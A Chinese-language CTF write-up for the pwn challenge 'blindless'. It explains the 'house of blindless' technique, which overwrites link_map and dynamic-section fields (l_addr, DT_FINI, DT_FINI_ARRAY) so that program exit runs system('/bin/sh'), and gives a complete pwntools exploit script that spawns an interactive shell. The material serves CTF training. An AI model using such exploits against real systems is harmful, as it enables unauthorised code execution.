# blindless

## 题目简述

题目是典型的 `house of blindless` 利用。程序提供受限写入 primitive，可以按偏移把内容写到目标地址附近。利用目标是改写动态链接器相关结构，使程序退出或执行析构逻辑时劫持到 `system("/bin/sh")`。

## 解题过程

核心思路是把可控字符串 `/bin/sh;` 写入可用内存，再修改 `link_map` / dynamic section 附近的字段：通过调整 `l_addr` 让 `DT_FINI` 的解析结果落到 `DT_DEBUG` 与 `system` 的相对差值上，同时清空 `DT_FINI_ARRAY`，最终触发 `system`。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from ctypes import *
#context.log_level = 'debug'
def write(addr,content):
    content = list(content)
    payload = "@" + p32(addr)
    for i in range(len(content)):
        payload += '.' + p8(ord(content[i]))
        payload += '>'
    return payload
def exp():
    p.recv()
    p.send(str(0x100000))
    p.recv()
    p.send(str(0x100))
    p.recv()
    payload = write(0x33f958 - 0x1c000,"/bin/sh;") #劫持参数
    payload += write(0x340180-0x33f958-0x8,p64(0x9)) #将l_addr改为DT_DEBUg和system函数的差值
    payload += write(0x340228-0x340180-0x8,p8(0x88-0x8)) #劫持DT_FINI指向DT_DEBUG
    payload += write(0x340290-0x340228 - 0x1,p64(0)) #使得DT_FINI_ARRAY为NULL
    payload += 'q'
    p.send(payload)
    p.interactive()
if __name__ == "__main__":
    binary = './main'
    elf = ELF('./main')
    context.binary = binary
    if(len(sys.argv) == 3):
        p = remote(sys.argv[1],sys.argv[2])
    else:
        p = process(binary)
    exp()
```

脚本中的 `write(addr, content)` 会生成题目交互协议需要的写入 payload。`exp()` 先设置两次程序参数，再连续写入 `/bin/sh;`、伪造的 `l_addr`、被劫持的 `DT_FINI` 指针和空的 `DT_FINI_ARRAY`，最后发送 `q` 触发退出流程并进入交互 shell。

## 方法总结

- 核心技巧：利用 `house of blindless` 改写动态链接器结构，把退出路径转成 `system("/bin/sh")`。
- 识别信号：Pwn 题只给有限写 primitive，且目标是动态链接 ELF 时，应检查 `.dynamic`、`link_map`、`DT_FINI`、`DT_FINI_ARRAY` 等退出时会被访问的结构。
- 复用要点：这类利用强依赖版本和偏移，WP 必须保留关键写入目标及其语义，而不只是贴 exploit。
